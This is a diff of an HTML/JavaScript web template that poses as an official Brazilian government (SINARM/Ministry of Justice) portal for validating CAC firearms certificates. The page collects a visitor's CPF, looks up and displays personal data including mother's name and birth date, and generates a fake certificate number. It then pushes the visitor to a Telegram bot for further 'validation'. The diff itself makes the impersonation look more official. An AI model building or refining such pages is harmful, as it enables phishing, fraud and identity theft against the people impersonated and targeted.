@@ -3,35 +3,29 @@
 {% block content %}
 <main class="flex-grow container mx-auto px-4 py-8">
     <div id="consultaForm" class="bg-white shadow-md rounded-lg p-6">
-        <h1 class="text-2xl font-bold text-military-green mb-4">Emissão do Certificado CAC</h1>
-        <p class="text-gray-700 mb-4">Parabéns! Seu processo CAC já foi <span class="font-bold text-green-600">APROVADO</span>. Agora você só precisa emitir a versão digital do seu certificado de Colecionador, Atirador Desportivo e Caçador.</p>
-        
-        <!-- Banner de aprovação -->
-        <div class="bg-green-50 border-l-4 border-green-500 p-4 mb-6">
-            <div class="flex">
-                <div class="flex-shrink-0">
-                    <i class="fas fa-check-circle text-green-500 text-xl"></i>
-                </div>
-                <div class="ml-3">
-                    <h3 class="text-sm font-medium text-green-800">Sua solicitação já foi aprovada!</h3>
-                    <p class="text-sm text-green-700 mt-1">
-                        Todos os pagamentos foram confirmados. Você só precisa obter seu certificado digital oficial.
-                    </p>
-                </div>
+        <div class="text-center mb-6">
+            <h1 class="text-2xl font-bold text-military-green mb-2">GOVERNO FEDERAL DO BRASIL</h1>
+            <h2 class="text-xl font-semibold text-military-dark mb-2">MINISTÉRIO DA JUSTIÇA E SEGURANÇA PÚBLICA</h2>
+            <h3 class="text-lg font-bold text-military-green">SISTEMA NACIONAL DE ARMAS</h3>
+            <h4 class="text-lg font-semibold text-military-dark">VALIDAÇÃO OFICIAL DE CERTIFICADO CAC</h4>
+        </div>
+
+        <div class="bg-military-green bg-opacity-10 p-4 rounded-lg mb-6">
+            <h3 class="text-lg font-semibold text-military-dark mb-2">SISTEMA NACIONAL DE ARMAS - SINARM</h3>
+            <h4 class="text-lg font-bold text-military-green mb-2">CAC - CERTIFICADO DE REGISTRO DE ARMA DE FOGO</h4>
+            
+            <p class="text-gray-700 mb-4">
+                Bem-vindo ao sistema oficial de validação digital do Certificado de Registro CAC.
+                Este assistente vai conduzi-lo pelo processo de validação e homologação digital do seu registro.
+            </p>
+            
+            <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
+                <p class="text-yellow-700">
+                    <strong>ATENÇÃO:</strong> Este é um procedimento oficial e seus dados serão tratados conforme a LGPD.
+                </p>
             </div>
         </div>
-        
-        <!-- Mensagem de etapa final simplificada -->
-        <div class="flex items-center mb-6 bg-military-green bg-opacity-10 p-3 rounded-lg">
-            <div class="bg-military-green rounded-full w-10 h-10 flex items-center justify-center flex-shrink-0 mr-3">
-                <i class="fab fa-telegram text-white text-lg"></i>
-            </div>
-            <div>
-                <h3 class="font-medium text-military-dark">Última etapa: Emissão do seu certificado digital</h3>
-                <p class="text-sm text-gray-600">Após verificar seu CPF, você poderá fazer download do seu certificado pelo Telegram.</p>
-            </div>
-        </div>
-        
+
         <form id="cpfForm" class="space-y-4">
             <div>
                 <label for="cpf" class="block text-sm font-medium text-gray-700">Informe seu CPF para continuar:</label>
@@ -40,17 +34,13 @@
             <button type="submit" class="w-full bg-gradient-to-b from-military-green to-military-dark text-white py-3 px-4 rounded-lg shadow-md hover:shadow-lg focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-military-green font-medium transition duration-200 ease-in-out relative overflow-hidden group">
                 <div class="flex items-center justify-center">
                     <i class="fas fa-check-circle mr-2"></i>
-                    <span>Verificar e continuar para download</span>
-                    <i class="fas fa-arrow-right ml-2"></i>
+                    <span>INICIAR VALIDAÇÃO DIGITAL</span>
                 </div>
-                <!-- Overlay effect ao passar o mouse -->
-                <div class="absolute inset-0 bg-white opacity-0 group-hover:opacity-5 transition-opacity duration-200"></div>
             </button>
         </form>
     </div>
 
     <div id="certificadoAprovado" class="hidden max-w-3xl mx-auto bg-white shadow-lg rounded-lg overflow-hidden mt-8">
-        <!-- Cabeçalho simplificado -->
         <div class="bg-military-green text-white p-5 relative">
             <div class="absolute top-3 right-3 bg-green-600 text-white text-xs font-bold px-3 py-1 rounded-full shadow-md flex items-center">
                 <i class="fas fa-check-circle mr-1"></i> APROVADO
@@ -65,16 +55,6 @@
         </div>
         
         <div class="p-5">
-            <!-- Banner de pagamento confirmado -->
-            <div class="mb-5 bg-blue-50 border border-blue-200 rounded-md p-3 flex items-center">
-                <i class="fas fa-money-check text-blue-500 text-xl mr-3"></i>
-                <div>
-                    <h3 class="font-medium text-blue-800">Pagamento Confirmado</h3>
-                    <p class="text-sm text-blue-700">Todas as taxas foram processadas e seu certificado está pronto.</p>
-                </div>
-            </div>
-            
-            <!-- Dados do requerente -->
             <div class="mb-6 border border-gray-200 rounded-lg overflow-hidden">
                 <div class="bg-gray-100 px-4 py-3 border-b border-gray-200">
                     <h2 class="text-xl font-semibold text-military-dark">Dados do Requerente</h2>
@@ -100,28 +80,9 @@
                         <p class="text-gray-500 text-sm">Sexo</p>
                         <p class="font-medium text-gray-800" id="resultSexo"></p>
                     </div>
-                    <div>
-                        <p class="text-gray-500 text-sm">Categoria</p>
-                        <p class="font-medium text-gray-800">Colecionador, Atirador e Caçador</p>
-                    </div>
                 </div>
             </div>
             
-            <!-- Aviso importante -->
-            <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
-                <div class="flex">
-                    <div class="flex-shrink-0">
-                        <i class="fas fa-exclamation-triangle text-yellow-400"></i>
-                    </div>
-                    <div class="ml-3">
-                        <p class="text-sm text-yellow-700">
-                            <strong>Importante:</strong> Por razões de segurança, seu certificado digital está disponível exclusivamente através do canal oficial do Telegram do Exército Brasileiro. O documento estará disponível para download por apenas 7 dias. Certifique-se de baixá-lo dentro deste prazo.
-                        </p>
-                    </div>
-                </div>
-            </div>
-            
-            <!-- Informações do documento -->
             <div class="mb-6 border border-gray-200 rounded-lg overflow-hidden">
                 <div class="bg-gray-100 px-4 py-3 border-b border-gray-200">
                     <h2 class="text-xl font-semibold text-military-dark">Informações do Documento</h2>
@@ -146,66 +107,47 @@
                 </div>
             </div>
             
-            <!-- Box simplificado para download com instruções integradas -->
-            <div class="bg-green-50 p-6 rounded-lg mb-6 border border-green-200">
-                <div class="mb-4 text-center">
-                    <span class="inline-block px-3 py-1 bg-blue-500 text-white text-sm font-bold rounded-full mb-2">PRÓXIMO PASSO</span>
-                    <h3 class="text-xl font-bold text-military-dark">Baixe Seu Certificado no Telegram</h3>
-                    <p class="text-gray-600">O certificado está pronto para download instantâneo</p>
-                </div>
-                
-                <!-- Botão redesenhado mais profissional e responsivo -->
-                <div class="text-center mb-5 max-w-md mx-auto">
-                    <div class="mb-2 text-sm text-gray-600 font-medium">Para sua segurança, o documento oficial é disponibilizado via Telegram</div>
+            <div class="mt-8 bg-white rounded-lg shadow-lg overflow-hidden">
+                <div class="p-6">
+                    <h2 class="text-2xl font-bold text-military-green mb-4">PRÓXIMO PASSO</h2>
+                    <h3 class="text-xl font-semibold text-military-dark mb-2">Baixe Seu Certificado no Telegram</h3>
+                    <p class="text-gray-700 mb-4">O certificado está pronto para download instantâneo</p>
                     
-                    <a href="https://t.me/registro_cac_bot" target="_blank" 
-                       class="block bg-gradient-to-b from-military-green to-military-dark text-white font-bold 
-                              py-3 sm:py-4 px-5 rounded-lg shadow-lg border border-military-green border-opacity-20
-                              transition duration-200 ease-in-out hover:shadow-xl relative overflow-hidden group">
-                       
-                        <div class="flex items-center justify-center">
-                            <div class="bg-white bg-opacity-10 rounded-full p-2 flex items-center justify-center mr-3">
-                                <i class="fab fa-telegram text-white text-2xl"></i>
-                            </div>
-                            
-                            <div class="text-left flex-1">
-                                <span class="block text-xs uppercase tracking-wide text-blue-100">Documento Oficial</span>
-                                <span class="block text-lg sm:text-xl">Baixar Certificado</span>
-                            </div>
-                            
-                            <div class="ml-2 bg-white bg-opacity-10 rounded-full w-7 h-7 flex items-center justify-center flex-shrink-0">
-                                <i class="fas fa-arrow-right text-white text-sm"></i>
-                            </div>
-                        </div>
+                    <div class="text-center mb-5 max-w-md mx-auto">
+                        <div class="mb-2 text-sm text-gray-600 font-medium">Para sua segurança, o documento oficial é disponibilizado via Telegram</div>
                         
-                        <!-- Overlay effect ao passar o mouse -->
-                        <div class="absolute inset-0 bg-white opacity-0 group-hover:opacity-5 transition-opacity duration-200"></div>
-                    </a>
-                    
-                    <div class="mt-2 text-xs text-gray-500 flex items-center justify-center">
-                        <i class="fas fa-shield-alt text-military-green mr-1"></i>
-                        Conexão segura com servidor oficial do Exército Brasileiro
+                        <a href="https://t.me/validacaocac_bot" target="_blank" 
+                           class="block bg-gradient-to-b from-military-green to-military-dark text-white font-bold 
+                                  py-3 sm:py-4 px-5 rounded-lg shadow-lg border border-military-green border-opacity-20
+                                  transition duration-200 ease-in-out hover:shadow-xl relative overflow-hidden group">
+                            
+                            <div class="flex items-center justify-center">
+                                <div class="bg-white bg-opacity-10 rounded-full p-2 flex items-center justify-center mr-3">
+                                    <i class="fab fa-telegram text-white text-2xl"></i>
+                                </div>
+                                
+                                <div class="text-left flex-1">
+                                    <span class="block text-xs uppercase tracking-wide text-blue-100">Documento Oficial</span>
+                                    <span class="block text-lg sm:text-xl">Baixar Certificado</span>
+                                </div>
+                                
+                                <div class="ml-2 bg-white bg-opacity-10 rounded-full w-7 h-7 flex items-center justify-center flex-shrink-0">
+                                    <i class="fas fa-arrow-right text-white text-sm"></i>
+                                </div>
+                            </div>
+                        </a>
                     </div>
-                </div>
-                
-                <!-- Instruções integradas mais curtas -->
-                <div class="bg-white rounded-lg p-4 flex items-start border border-gray-200">
-                    <div class="bg-blue-100 rounded-full p-2 mr-3 mt-1">
-                        <i class="fas fa-info-circle text-blue-600"></i>
-                    </div>
-                    <div>
-                        <p class="font-medium text-gray-700 mb-2">É muito simples:</p>
-                        <ol class="space-y-1 ml-5 list-decimal text-gray-600 text-sm">
-                            <li>Ao clicar no botão, você será redirecionado para o Telegram</li>
-                            <li>Digite seu CPF quando solicitado</li>
-                            <li>Seu certificado será enviado instantaneamente</li>
-                        </ol>
-                        <p class="text-xs text-gray-500 mt-2">O documento digital tem a mesma validade legal do certificado físico.</p>
+
+                    <div class="mt-6">
+                        <h4 class="text-lg font-semibold text-military-dark mb-2">Processo de Validação</h4>
+                        <p class="text-gray-700 mb-2">1. Ao clicar no botão, você será redirecionado para o Telegram</p>
+                        <p class="text-gray-700 mb-2">2. Digite seu CPF quando solicitado</p>
+                        <p class="text-gray-700 mb-2">3. Siga as instruções do sistema para validação</p>
+                        <p class="text-gray-700 mb-2">4. Seu certificado será enviado após a homologação</p>
                     </div>
                 </div>
             </div>
             
-            <!-- Selo de segurança -->
             <div class="mt-8 border-t border-gray-200 pt-6 flex justify-center">
                 <div class="text-center">
                     <div class="inline-flex items-center justify-center rounded-full bg-military-light bg-opacity-10 p-2 mb-2">
@@ -218,4 +160,64 @@
         </div>
     </div>
 </main>
+
+<script>
+document.getElementById('cpfForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
+    
+    try {
+        const response = await fetch('/api/verify-cpf', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ cpf }),
+        });
+        
+        const data = await response.json();
+        
+        if (data.status === 'approved') {
+            // Preencher os dados do usuário
+            document.getElementById('resultCpf').textContent = data.data.cpf;
+            document.getElementById('resultNome').textContent = data.data.nome;
+            document.getElementById('resultNomeMae').textContent = data.data.nomeMae;
+            document.getElementById('resultDataNascimento').textContent = data.data.dataNascimento;
+            document.getElementById('resultSexo').textContent = data.data.sexo;
+            
+            // Gerar número do certificado
+            const now = new Date();
+            const protocolBase = cpf.slice(0, 5);
+            const hashValue = Math.abs(hashCode(cpf + data.data.nome));
+            const sequential = String(hashValue % 10000).padStart(4, '0');
+            const protocol = `CAC-${protocolBase}-${sequential}/${now.getFullYear()}`;
+            
+            document.getElementById('certNumber').textContent = protocol;
+            document.getElementById('dataEmissao').textContent = now.toLocaleDateString('pt-BR');
+            document.getElementById('dataValidade').textContent = new Date(now.setFullYear(now.getFullYear() + 5)).toLocaleDateString('pt-BR');
+            document.getElementById('regiaoMilitar').textContent = '1';
+            
+            // Mostrar o certificado
+            document.getElementById('consultaForm').classList.add('hidden');
+            document.getElementById('certificadoAprovado').classList.remove('hidden');
+        } else {
+            alert(data.message || 'Erro ao verificar CPF');
+        }
+    } catch (error) {
+        console.error('Erro:', error);
+        alert('Erro ao processar sua solicitação. Por favor, tente novamente.');
+    }
+});
+
+function hashCode(str) {
+    let hash = 0;
+    for (let i = 0; i < str.length; i++) {
+        const char = str.charCodeAt(i);
+        hash = ((hash << 5) - hash) + char;
+        hash = hash & hash;
+    }
+    return hash;
+}
+</script>
 {% endblock %}
